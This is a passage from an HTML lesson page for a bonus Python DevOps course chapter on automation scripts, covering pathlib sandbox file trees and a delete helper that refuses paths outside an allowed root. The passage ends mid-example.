@@ -1,0 +1,1950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>AI/ML: Zero to Hero — Bonus DevOps 3: Automation Scripts &amp; Resilience</title>
+<!-- USAGE:
+  Open this file in Chrome, Firefox or Edge. Needs internet ONCE per session to load Pyodide
+  (real CPython compiled to WebAssembly). This is a BONUS chapter — track 3 of 5 in the
+  "Python for DevOps: Day-to-Day" set — NOT part of the 41-chapter core curriculum, same tier
+  as the dsa/ and systems/ modules. Everything graded here is real, runnable, pure standard-library
+  Python (pathlib, hashlib, tempfile, datetime, re, argparse, logging, shlex): filesystem work
+  happens in Pyodide's in-memory filesystem, and every clock is injected so output is deterministic.
+  subprocess, signal handling and thread pools need a real operating system, so those blocks are
+  reference-only (no Run button) — same treatment as python/ch07-python-devops-apis.html.
+  No XP, no localStorage progress tracking — exercises/capstone/quiz run and grade live in the
+  browser, but nothing persists across page loads.
+-->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,600;1,400&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#0F1117; --card:#1A1D27; --card2:#21253A; --border:#2A2D3E;
+  --violet:#7C5CFC; --violet-light:#9B7FFF; --violet-bg:rgba(124,92,252,.1);
+  --cyan:#00D9A6; --cyan-bg:rgba(0,217,166,.08);
+  --gold:#FFB800; --gold-bg:rgba(255,184,0,.1);
+  --red:#FF5757; --red-bg:rgba(255,87,87,.08);
+  --green:#22C55E; --green-bg:rgba(34,197,94,.08);
+  --blue:#3B82F6; --blue-bg:rgba(59,130,246,.08);
+  --text:#E8EAF0; --t2:#9196A8; --t3:#5A5F72;
+  --sans:'Inter',sans-serif; --mono:'JetBrains Mono',monospace;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.6;min-height:100vh}
+a{color:var(--violet);text-decoration:none}
+button{cursor:pointer;font-family:var(--sans);border:none;outline:none}
+textarea,input{font-family:var(--mono);outline:none;border:none}
+
+.shell{display:flex;min-height:100vh}
+#sidebar{width:260px;background:var(--card);border-right:1px solid var(--border);position:fixed;top:0;left:0;height:100vh;overflow-y:auto;z-index:100;transition:transform .25s}
+#content{margin-left:260px;flex:1;min-height:100vh}
+#console-dock{position:fixed;bottom:0;right:0;width:420px;background:var(--card);border-left:1px solid var(--border);border-top:1px solid var(--border);height:320px;display:flex;flex-direction:column;z-index:50;transition:transform .25s}
+
+.sb-logo{padding:20px;border-bottom:1px solid var(--border);display:block}
+.sb-logo-title{font-size:16px;font-weight:800;color:var(--violet)}
+.sb-logo-sub{font-size:11px;color:var(--t3);margin-top:2px}
+.sb-back{display:flex;align-items:center;gap:6px;padding:10px 20px;font-size:11.5px;color:var(--t3);border-bottom:1px solid var(--border)}
+.sb-back:hover{color:var(--violet)}
+.sb-section{padding:12px 16px 4px;font-size:10px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--t3)}
+.sb-item{display:flex;align-items:center;gap:10px;padding:9px 16px;font-size:12.5px;color:var(--t2);cursor:pointer;transition:all .12s;border-left:2px solid transparent}
+.sb-item:hover{background:var(--card2);color:var(--text)}
+.sb-item.active{background:var(--violet-bg);color:var(--violet);border-left-color:var(--violet);font-weight:600}
+.sb-icon{font-size:12px;width:16px;text-align:center;flex-shrink:0}
+.sb-step{flex:1}
+
+#topbar{background:var(--card);border-bottom:1px solid var(--border);padding:0 32px;height:56px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:40;margin-right:420px}
+.tb-chapter{font-size:13px;font-weight:700;color:var(--violet)}
+.tb-title{font-size:15px;font-weight:700}
+.tb-gap{flex:1}
+.tb-chip{display:flex;align-items:center;gap:6px;background:var(--card2);border:1px solid var(--border);border-radius:20px;padding:5px 12px;font-size:11.5px;font-weight:600;color:var(--t2)}
+.tb-chip .val{color:var(--text)}
+
+#main-content{padding:0 40px 120px;max-width:820px;margin-right:420px}
+
+.section-tabs{display:flex;gap:0;border-bottom:2px solid var(--border);margin-bottom:32px;padding:24px 0 0}
+.stab{padding:10px 22px;font-size:13px;font-weight:600;color:var(--t2);cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;transition:all .15s;white-space:nowrap}
+.stab:hover{color:var(--text)}
+.stab.active{color:var(--violet);border-bottom-color:var(--violet)}
+
+.lesson-section{display:none}.lesson-section.show{display:block}
+
+.lesson-intro{background:linear-gradient(135deg,rgba(124,92,252,.12),rgba(0,217,166,.06));border:1px solid rgba(124,92,252,.25);border-radius:14px;padding:28px 32px;margin-bottom:32px}
+.lesson-intro h1{font-size:28px;font-weight:800;line-height:1.2;margin-bottom:10px}
+.lesson-intro h1 span{color:var(--violet)}
+.lesson-intro p{font-size:14px;color:var(--t2);line-height:1.75;max-width:600px}
+.lesson-intro .badge-row{display:flex;gap:8px;margin-top:16px;flex-wrap:wrap}
+.badge{display:inline-flex;align-items:center;gap:5px;background:var(--card);border:1px solid var(--border);border-radius:20px;padding:4px 12px;font-size:11px;font-weight:600;color:var(--t2)}
+.badge.capstone{background:var(--violet-bg);border-color:rgba(124,92,252,.3);color:var(--violet)}
+
+.lesson-h2{font-size:20px;font-weight:800;margin:36px 0 12px;display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:1px solid var(--border)}
+.lesson-h2::before{content:'';display:block;width:4px;height:20px;background:var(--violet);border-radius:2px;flex-shrink:0}
+.lesson-p{font-size:14px;color:var(--t2);line-height:1.8;margin-bottom:14px}
+.lesson-p strong{color:var(--text);font-weight:600}
+.lesson-p code{font-family:var(--mono);font-size:12.5px;background:var(--card2);padding:1px 6px;border-radius:4px;color:var(--violet)}
+
+.info-box{border-radius:10px;padding:14px 18px;margin:16px 0;font-size:13.5px;line-height:1.7;display:flex;gap:12px}
+.info-box .ib-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.info-box .ib-body strong{display:block;font-weight:700;margin-bottom:3px}
+.info-box.note{background:var(--blue-bg);border:1px solid rgba(59,130,246,.2);color:#93B4FF}
+.info-box.tip{background:var(--cyan-bg);border:1px solid rgba(0,217,166,.2);color:#6EE7B7}
+.info-box.warn{background:var(--gold-bg);border:1px solid rgba(255,184,0,.2);color:#FCD34D}
+.info-box.danger{background:var(--red-bg);border:1px solid rgba(255,87,87,.2);color:#FCA5A5}
+
+.code-block{background:#0A0C12;border:1px solid var(--border);border-radius:10px;margin:16px 0;overflow:hidden}
+.cb-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#111320;border-bottom:1px solid var(--border)}
+.cb-label{font-family:var(--mono);font-size:10.5px;color:var(--t3);font-weight:600;letter-spacing:.5px;text-transform:uppercase}
+.cb-run{display:flex;align-items:center;gap:5px;background:var(--violet);color:#fff;border-radius:6px;padding:4px 12px;font-size:11px;font-weight:700;transition:background .12s}
+.cb-run:hover{background:var(--violet-light)}
+.cb-code{padding:16px;font-family:var(--mono);font-size:12.5px;line-height:1.85;overflow-x:auto;white-space:pre;color:#DDE8F5}
+.kw{color:#FF7B72}.fn{color:#D2A8FF}.st{color:#A5D6FF}.cm{color:#4A5A72;font-style:italic}.nm{color:#79C0FF}.bi{color:#FFA657}.op{color:#FF7B72}.cls{color:#7EE787}
+
+.lesson-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13px}
+.lesson-table th{background:var(--card2);padding:10px 14px;text-align:left;font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.5px;color:var(--t2);border:1px solid var(--border)}
+.lesson-table td{padding:10px 14px;border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:12.5px}
+.lesson-table tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.lesson-table td.highlight{color:var(--violet);font-weight:600}
+
+.step-list{list-style:none;margin:12px 0}
+.step-list li{display:flex;gap:12px;padding:8px 0;font-size:13.5px;color:var(--t2);line-height:1.6}
+.step-list li::before{content:attr(data-n);width:22px;height:22px;background:var(--violet);color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;flex-shrink:0;margin-top:2px}
+.step-list li strong{color:var(--text)}
+
+.practice-section{display:none}.practice-section.show{display:block}
+.practice-intro{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:24px}
+.practice-intro h2{font-size:20px;font-weight:800;margin-bottom:6px}
+.practice-intro p{font-size:13.5px;color:var(--t2);line-height:1.65}
+
+.exercise{background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:20px;overflow:hidden}
+.ex-header{padding:16px 20px;border-bottom:1px solid var(--border);background:var(--card2);display:flex;align-items:flex-start;gap:12px}
+.ex-num{width:30px;height:30px;border-radius:8px;background:var(--violet);color:#fff;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ex-meta{flex:1}
+.ex-title{font-size:15px;font-weight:700;margin-bottom:3px}
+.ex-diff{font-size:10.5px;font-weight:700;letter-spacing:.7px;text-transform:uppercase;padding:2px 8px;border-radius:6px;display:inline-block;margin-bottom:6px}
+.diff-easy{background:var(--cyan-bg);color:var(--cyan)}
+.diff-medium{background:var(--gold-bg);color:var(--gold)}
+.diff-hard{background:var(--red-bg);color:var(--red)}
+.ex-desc{font-size:13.5px;color:var(--t2);line-height:1.65}
+.ex-task{background:#0A0C12;border-top:1px solid var(--border);padding:14px 20px;font-size:13px;color:var(--text);line-height:1.7;white-space:pre-line;font-family:var(--mono);border-bottom:1px solid var(--border)}
+.ex-editor-wrap{padding:14px 20px;display:flex;flex-direction:column;gap:10px}
+.ex-editor{width:100%;background:#0A0C12;border:1px solid var(--border);border-radius:8px;padding:14px;font-family:var(--mono);font-size:12.5px;color:var(--text);resize:none;min-height:120px;line-height:1.7;tab-size:4}
+.ex-editor:focus{border-color:var(--violet)}
+.ex-btn-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.ex-run{background:var(--violet);color:#fff;border-radius:7px;padding:8px 18px;font-size:12.5px;font-weight:700;transition:background .12s}
+.ex-run:hover{background:var(--violet-light)}
+.ex-hint{background:transparent;border:1px solid var(--border);color:var(--t2);border-radius:7px;padding:8px 14px;font-size:12.5px;transition:all .12s}
+.ex-hint:hover{border-color:var(--violet);color:var(--violet)}
+.ex-reset{background:transparent;border:1px solid var(--border);color:var(--t3);border-radius:7px;padding:8px 12px;font-size:12px;margin-left:auto}
+.ex-solution{background:transparent;border:1px solid var(--cyan);color:var(--cyan);border-radius:7px;padding:8px 14px;font-size:12px}
+.ex-output{margin:0 20px 14px;background:#0A0C12;border:1px solid var(--border);border-radius:8px;padding:12px 14px;font-family:var(--mono);font-size:12px;line-height:1.6;min-height:40px;white-space:pre-wrap;display:none}
+.ex-output.show{display:block}
+.ex-output.ok{border-color:rgba(34,197,94,.3);color:#86EFAC}
+.ex-output.err{border-color:rgba(255,87,87,.3);color:#FCA5A5}
+.ex-result{margin:0 20px 16px;padding:10px 14px;border-radius:8px;font-size:13px;font-weight:700;display:none;align-items:center;gap:8px}
+.ex-result.show{display:flex}
+.ex-result.pass{background:var(--green-bg);color:var(--green);border:1px solid rgba(34,197,94,.2)}
+.ex-result.fail{background:var(--red-bg);color:var(--red);border:1px solid rgba(255,87,87,.2)}
+
+.project-section{display:none}.project-section.show{display:block}
+.project-banner{background:linear-gradient(135deg,rgba(124,92,252,.15),rgba(0,217,166,.08));border:1px solid rgba(124,92,252,.3);border-radius:14px;padding:28px 32px;margin-bottom:28px}
+.project-banner h2{font-size:22px;font-weight:800;margin-bottom:6px}
+.project-banner h2 span{color:var(--violet)}
+.project-banner p{font-size:13.5px;color:var(--t2);line-height:1.7;margin-bottom:16px}
+.project-tags{display:flex;gap:8px;flex-wrap:wrap}
+.ptag{font-size:11px;font-weight:700;padding:3px 10px;border-radius:10px;background:var(--violet-bg);color:var(--violet);border:1px solid rgba(124,92,252,.2)}
+
+.project-spec{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:20px}
+.project-spec h3{font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.spec-list{list-style:none}
+.spec-list li{padding:8px 0;font-size:13.5px;color:var(--t2);border-bottom:1px solid var(--border);display:flex;gap:10px}
+.spec-list li:last-child{border-bottom:none}
+.spec-list li::before{content:'→';color:var(--violet);font-weight:700;flex-shrink:0}
+
+.project-editor{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
+.pe-header{background:var(--card2);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.pe-title{font-size:13px;font-weight:700}
+.pe-run{background:var(--violet);color:#fff;border-radius:7px;padding:7px 16px;font-size:12.5px;font-weight:700;display:flex;align-items:center;gap:6px}
+.pe-run:hover{background:var(--violet-light)}
+textarea#project-editor{width:100%;background:#0A0C12;border:none;padding:16px;font-family:var(--mono);font-size:12.5px;color:var(--text);resize:none;min-height:420px;line-height:1.7;display:block;tab-size:4}
+textarea#project-editor:focus{outline:none}
+.pe-output{border-top:1px solid var(--border);padding:14px 16px;font-family:var(--mono);font-size:12px;line-height:1.6;background:#050608;min-height:60px;white-space:pre-wrap;color:var(--t2)}
+.pe-output.has-output{color:var(--text)}
+.pe-result{padding:12px 20px;border-top:1px solid var(--border);font-size:13px;font-weight:700;display:none;align-items:center;gap:8px}
+.pe-result.show{display:flex}
+.pe-result.pass{background:var(--green-bg);color:var(--green)}
+.pe-result.fail{background:var(--red-bg);color:var(--red)}
+
+.checklist{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:20px}
+.checklist h3{font-size:14px;font-weight:700;margin-bottom:14px}
+.check-item{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid var(--border);font-size:13.5px;color:var(--t2)}
+.check-item:last-child{border-bottom:none}
+.check-icon{font-size:15px;flex-shrink:0}
+
+.quiz-section{display:none}.quiz-section.show{display:block}
+.quiz-banner{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px 28px;margin-bottom:24px}
+.quiz-banner h2{font-size:20px;font-weight:800;margin-bottom:6px}
+.quiz-banner p{font-size:13.5px;color:var(--t2);line-height:1.65}
+.quiz-score{display:inline-flex;align-items:center;gap:8px;background:var(--violet-bg);border:1px solid rgba(124,92,252,.2);border-radius:8px;padding:6px 14px;font-size:13px;font-weight:700;color:var(--violet);margin-top:12px}
+
+.quiz-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px 28px;margin-bottom:16px}
+.q-num{font-size:10.5px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--t3);margin-bottom:8px}
+.q-text{font-size:15px;font-weight:600;line-height:1.5;margin-bottom:18px}
+.q-text code{font-family:var(--mono);background:var(--card2);padding:2px 7px;border-radius:4px;color:var(--violet);font-size:13px}
+.q-options{display:flex;flex-direction:column;gap:8px;margin-bottom:16px}
+.q-opt{display:flex;align-items:center;gap:12px;padding:12px 16px;background:var(--card2);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .15s;font-size:13.5px;text-align:left}
+.q-opt:hover{border-color:var(--violet);color:var(--violet)}
+.q-opt.selected{border-color:var(--violet);background:var(--violet-bg);color:var(--violet)}
+.q-opt.correct{border-color:var(--green);background:var(--green-bg);color:var(--green)}
+.q-opt.wrong{border-color:var(--red);background:var(--red-bg);color:var(--red)}
+.q-opt-letter{width:26px;height:26px;border-radius:6px;background:var(--border);color:var(--t2);font-size:11.5px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--mono)}
+.q-opt.selected .q-opt-letter,.q-opt.correct .q-opt-letter{background:var(--violet);color:#fff}
+.q-opt.wrong .q-opt-letter{background:var(--red);color:#fff}
+.q-code-input{width:100%;background:#0A0C12;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:var(--mono);font-size:12.5px;color:var(--text);resize:none;min-height:80px;line-height:1.7;margin-bottom:12px}
+.q-code-input:focus{border-color:var(--violet);outline:none}
+.q-submit{background:var(--violet);color:#fff;border-radius:7px;padding:8px 20px;font-size:13px;font-weight:700;transition:background .12s}
+.q-submit:hover{background:var(--violet-light)}
+.q-feedback{margin-top:12px;padding:10px 14px;border-radius:8px;font-size:13px;display:none}
+.q-feedback.show{display:block}
+.q-feedback.correct{background:var(--green-bg);border:1px solid rgba(34,197,94,.2);color:#86EFAC}
+.q-feedback.wrong{background:var(--red-bg);border:1px solid rgba(255,87,87,.2);color:#FCA5A5}
+
+.quiz-submit-all{background:var(--violet);color:#fff;border-radius:10px;padding:14px 32px;font-size:15px;font-weight:700;width:100%;margin-top:8px;transition:background .12s}
+.quiz-submit-all:hover{background:var(--violet-light)}
+.quiz-result-banner{border-radius:12px;padding:24px 28px;margin-top:20px;display:none}
+.quiz-result-banner.show{display:block}
+.quiz-result-banner.pass{background:linear-gradient(135deg,rgba(34,197,94,.12),rgba(0,217,166,.08));border:1px solid rgba(34,197,94,.25)}
+.quiz-result-banner.fail{background:var(--red-bg);border:1px solid rgba(255,87,87,.2)}
+.qrb-title{font-size:22px;font-weight:800;margin-bottom:8px}
+.qrb-sub{font-size:13.5px;color:var(--t2);line-height:1.65}
+.next-btn{display:inline-flex;align-items:center;gap:8px;background:var(--violet);color:#fff;border-radius:10px;padding:12px 24px;font-size:14px;font-weight:700;margin-top:16px;cursor:pointer;border:none;transition:background .12s}
+.next-btn:hover{background:var(--violet-light)}
+
+.cd-header{background:var(--card2);border-bottom:1px solid var(--border);padding:10px 14px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+.cd-title{font-size:12.5px;font-weight:700;display:flex;align-items:center;gap:7px}
+.cd-dot{width:7px;height:7px;border-radius:50%;background:var(--cyan)}
+.cd-loading .cd-dot{background:var(--gold);animation:blink .8s infinite}
+.cd-err .cd-dot{background:var(--red)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+.cd-status{font-size:10px;color:var(--t3);font-weight:600;font-family:var(--mono)}
+.cd-out{flex:1;overflow-y:auto;padding:8px 12px;background:#050608;font-family:var(--mono);font-size:11.5px;line-height:1.65;min-height:0}
+.cl{word-break:break-all;white-space:pre-wrap}.cl.out{color:#C9D5E5}.cl.err{color:#FCA5A5}.cl.info{color:var(--t3);font-style:italic}.cl.ok{color:var(--cyan)}
+.cd-input-row{display:flex;align-items:flex-end;gap:6px;padding:8px;border-top:1px solid var(--border);background:var(--card2);flex-shrink:0}
+.cd-prompt{font-family:var(--mono);font-size:13px;color:var(--violet);font-weight:700;padding-bottom:5px;flex-shrink:0}
+#cd-input{flex:1;background:transparent;resize:none;font-size:11.5px;line-height:1.6;min-height:32px;max-height:100px;padding:5px 0;color:var(--text);font-family:var(--mono)}
+.cd-run{background:var(--violet);color:#fff;border-radius:5px;padding:5px 11px;font-size:11.5px;font-weight:700;flex-shrink:0;align-self:flex-end;transition:background .12s}
+.cd-run:hover{background:var(--violet-light)}
+.cd-clear{background:transparent;border:1px solid var(--border);color:var(--t3);border-radius:5px;padding:5px 9px;font-size:11px;flex-shrink:0;align-self:flex-end}
+.cd-clear:hover{border-color:var(--border);color:var(--t2)}
+
+#mob-menu{display:none;position:fixed;top:0;left:0;right:0;background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;z-index:200;align-items:center;gap:12px}
+#mob-menu-btn{font-size:18px;background:transparent;border:none;color:var(--text);cursor:pointer}
+#mob-title{font-size:14px;font-weight:700;flex:1}
+#mob-console-btn{font-size:11px;font-weight:700;background:var(--violet-bg);color:var(--violet);border:1px solid rgba(124,92,252,.3);border-radius:6px;padding:5px 10px}
+
+@media(max-width:1100px){
+  #console-dock{width:360px}
+  #topbar{margin-right:360px}
+  #main-content{margin-right:360px;padding:0 24px 120px}
+}
+@media(max-width:820px){
+  #sidebar{transform:translateX(-100%)}
+  #sidebar.mob-open{transform:translateX(0)}
+  #content{margin-left:0}
+  #topbar{margin-right:0;padding:0 16px}
+  #main-content{margin-right:0;padding:0 16px 140px}
+  #console-dock{width:100%;border-left:none;border-right:none;height:260px;transform:translateY(100%);transition:transform .25s}
+  #console-dock.mob-open{transform:translateY(0)}
+  #mob-menu{display:flex}
+  #content{padding-top:52px}
+  .section-tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
+}
+
+.next-chapter-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px 28px;margin-top:32px;display:flex;align-items:center;gap:20px}
+.ncc-icon{font-size:36px;flex-shrink:0}
+.ncc-info h3{font-size:16px;font-weight:800;margin-bottom:4px}
+.ncc-info p{font-size:13px;color:var(--t2);line-height:1.6}
+.ncc-btn{margin-left:auto;background:var(--violet);color:#fff;border-radius:10px;padding:10px 20px;font-size:13px;font-weight:700;white-space:nowrap;border:none;cursor:pointer;flex-shrink:0;text-decoration:none;display:inline-flex;align-items:center}
+.ncc-btn:hover{background:var(--violet-light)}
+
+.spark{position:fixed;pointer-events:none;z-index:9999;animation:spark .7s ease-out forwards;font-size:20px}
+@keyframes spark{0%{transform:scale(.2) translateY(0);opacity:1}100%{transform:scale(1.4) translateY(-80px);opacity:0}}
+
+.interview-section{display:none}.interview-section.show{display:block}
+.interview-intro{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:24px}
+.interview-intro h2{font-size:20px;font-weight:800;margin-bottom:6px}
+.interview-intro p{font-size:13.5px;color:var(--t2);line-height:1.65}
+.iq-card{background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:12px;overflow:hidden;cursor:pointer}
+.iq-q{padding:16px 20px;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:700}
+.iq-q .iq-arrow{margin-left:auto;color:var(--t3);transition:transform .2s;font-size:12px}
+.iq-card.open .iq-arrow{transform:rotate(90deg)}
+.iq-a{max-height:0;overflow:hidden;transition:max-height .25s ease}
+.iq-card.open .iq-a{max-height:700px}
+.iq-a-inner{padding:0 20px 18px;font-size:13.5px;color:var(--t2);line-height:1.75;border-top:1px solid var(--border);padding-top:14px}
+.iq-a-inner code{font-family:var(--mono);font-size:12.5px;background:var(--card2);padding:1px 6px;border-radius:4px;color:var(--violet)}
+</style>
+</head>
+<body>
+
+<div id="mob-menu">
+  <button id="mob-menu-btn" onclick="toggleSidebar()">☰</button>
+  <div id="mob-title">DevOps 3: Automation Scripts &amp; Resilience</div>
+  <button id="mob-console-btn" onclick="toggleMobConsole()">⚡ Console</button>
+</div>
+
+<div class="shell">
+
+<div id="sidebar">
+  <a class="sb-logo" href="../index.html">
+    <div class="sb-logo-title">AI/ML: Zero to Hero</div>
+    <div class="sb-logo-sub">Bonus · Python for DevOps · 3 of 5</div>
+  </a>
+  <a class="sb-back" href="do02-config-yaml-json-toml.html">← DevOps 2: Config, YAML, JSON &amp; TOML</a>
+  <div class="sb-section">DevOps 3 · Automation Scripts &amp; Resilience</div>
+  <div class="sb-item active" id="sb-lesson" onclick="showSection('lesson')"><span class="sb-icon">📖</span><span class="sb-step">Lesson</span></div>
+  <div class="sb-item" id="sb-practice" onclick="showSection('practice')"><span class="sb-icon">✏️</span><span class="sb-step">Practice (5 exercises)</span></div>
+  <div class="sb-item" id="sb-project" onclick="showSection('project')"><span class="sb-icon">🏗️</span><span class="sb-step">Capstone</span></div>
+  <div class="sb-item" id="sb-quiz" onclick="showSection('quiz')"><span class="sb-icon">🧪</span><span class="sb-step">Quiz (5 questions)</span></div>
+  <div class="sb-item" id="sb-interview" onclick="showSection('interview')"><span class="sb-icon">💼</span><span class="sb-step">Interview Prep</span></div>
+  <div class="sb-section" style="margin-top:12px">Coming Next — Python for DevOps</div>
+  <div class="sb-item" style="opacity:.6" onclick="window.location.href='do04-cloud-and-container-ops.html'"><span class="sb-icon">☁️</span><span class="sb-step">DevOps 4: Cloud &amp; Container Ops</span></div>
+</div>
+
+<div id="content">
+  <div id="topbar">
+    <div class="tb-chapter">Bonus DevOps 3 of 5</div>
+    <div class="tb-title">Automation Scripts &amp; Resilience</div>
+    <div class="tb-gap"></div>
+    <div class="tb-chip" id="py-chip">🟡 <span>Loading Python...</span></div>
+  </div>
+
+  <div id="main-content">
+    <div class="section-tabs">
+      <div class="stab active" id="tab-lesson"   onclick="showSection('lesson')">📖 Lesson</div>
+      <div class="stab" id="tab-practice" onclick="showSection('practice')">✏️ Practice</div>
+      <div class="stab" id="tab-project"  onclick="showSection('project')">🏗️ Capstone</div>
+      <div class="stab" id="tab-quiz"     onclick="showSection('quiz')">🧪 Quiz</div>
+      <div class="stab" id="tab-interview" onclick="showSection('interview')">💼 Interview Prep</div>
+    </div>
+
+<div class="lesson-section show" id="sec-lesson">
+  <div class="lesson-intro">
+    <h1>Python for DevOps 3:<br/><span>Automation Scripts &amp; Resilience</span></h1>
+    <p>Anyone can write a script that works once on their laptop. The job is writing the script that is still safe at 3&nbsp;a.m. on a production box, when the disk is full, the network is flaky, the cron job fires twice, and someone runs it by hand "just to check." This chapter is about the habits that separate the two: dry-runs, injected clocks, idempotency, atomic writes, locks, retries that don't melt the service they're retrying, honest exit codes, and never letting user input near a shell.</p>
+    <div class="badge-row">
+      <span class="badge">🕐 ~75 min read</span>
+      <span class="badge">💻 5 exercises</span>
+      <span class="badge capstone">🏗️ Capstone: BackupJanitor</span>
+      <span class="badge">🧪 5-question quiz</span>
+      <span class="badge">💼 12 Interview Prep Q&amp;A</span>
+    </div>
+  </div>
+
+  <!-- 3.1 -->
+  <div class="lesson-h2">3.1 — Filesystem Automation With pathlib, shutil and tempfile</div>
+  <p class="lesson-p"><code>pathlib.Path</code> is the modern way to touch the filesystem from a script: paths are objects, <code>/</code> joins them, and <code>.parent</code>, <code>.name</code>, <code>.suffix</code>, <code>.read_text()</code>, <code>.rglob()</code> replace a pile of <code>os.path.join</code> calls and string slicing. Two habits matter more than the API: <strong>build test data in a throwaway directory</strong> (<code>tempfile.mkdtemp()</code> or <code>TemporaryDirectory()</code>) so your automation never has to be tried out on real data, and <strong>make every step safe to repeat</strong> (<code>mkdir(parents=True, exist_ok=True)</code> instead of "create it and crash if it exists"). The helper below builds a small file tree with fixed contents and fixed modification times, and you'll reuse it for the next few sections.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Build a sandbox file tree, then walk it</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> os, tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">def</span> <span class="fn">make_tree</span>(root, spec):
+    <span class="st">"""spec maps 'relative/path' -&gt; (content_bytes, epoch_mtime)."""</span>
+    <span class="kw">for</span> rel, (data, mtime) <span class="kw">in</span> spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=<span class="kw">True</span>, exist_ok=<span class="kw">True</span>)   <span class="cm"># exist_ok =&gt; safe to re-run</span>
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))                   <span class="cm"># pin mtime so output is deterministic</span>
+
+root = Path(tempfile.mkdtemp(prefix=<span class="st">'do03-'</span>))
+make_tree(root, {
+    <span class="st">'app/logs/app.log'</span>:   (<span class="st">b'x'</span> * <span class="nm">5000</span>,  <span class="nm">1_700_000_000</span>),
+    <span class="st">'app/logs/app.log.1'</span>: (<span class="st">b'y'</span> * <span class="nm">20000</span>, <span class="nm">1_699_000_000</span>),
+    <span class="st">'app/cache/blob.bin'</span>: (<span class="st">b'z'</span> * <span class="nm">90000</span>, <span class="nm">1_698_000_000</span>),
+    <span class="st">'app/config.yaml'</span>:    (<span class="st">b'name: demo\n'</span>, <span class="nm">1_700_500_000</span>),
+})
+<span class="kw">for</span> p <span class="kw">in</span> <span class="bi">sorted</span>(root.rglob(<span class="st">'*'</span>)):
+    <span class="kw">if</span> p.is_file():
+        <span class="bi">print</span>(<span class="st">f'{p.relative_to(root).as_posix():&lt;20} {p.stat().st_size:&gt;6} bytes'</span>)</div>
+  </div>
+  <p class="lesson-p"><code>shutil</code> covers the operations <code>pathlib</code> doesn't: <code>shutil.copy2(src, dst)</code> copies <em>and preserves timestamps</em> (plain <code>copy</code> doesn't), <code>shutil.copytree</code> and <code>shutil.rmtree</code> handle whole directories, and <code>shutil.disk_usage(path)</code> returns total/used/free bytes for the filesystem a path lives on. The dangerous one is deletion. Automation that deletes must prove the target is inside the directory it was pointed at, <em>after</em> resolving <code>..</code> segments and symlinks — otherwise a bad config value or a crafted filename turns your cleanup script into <code>rm -rf</code> on something precious.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Refuse to delete outside the allowed root</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> os, tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">def</span> <span class="fn">safe_delete</span>(target, root):
+    target, root = Path(target).resolve(), Path(root).resolve()
+    <span class="kw">if</span> target == root <span class="kw">or</span> <span class="kw">not</span> target.is_relative_to(root):
+        <span class="kw">raise</span> ValueError(<span class="st">f'refusing to delete {target.name}: it is outside the allowed root'</span>)
+    target.unlink()
+
+root = Path(tempfile.mkdtemp())
+(root / <span class="st">'old.log'</span>).write_text(<span class="st">'stale'</span>)
+outside = Path(tempfile.mkdtemp()) / <span class="st">'precious.db'</span>
+outside.write_text(<span class="st">'do not touch'</span>)
+
+safe_delete(root / <span class="st">'old.log'</span>, root)
+<span class="bi">print</span>(<span class="st">'deleted inside root:'</span>, <span class="kw">not</span> (root / <span class="st">'old.log'</span>).exists())
+<span class="kw">try</span>:
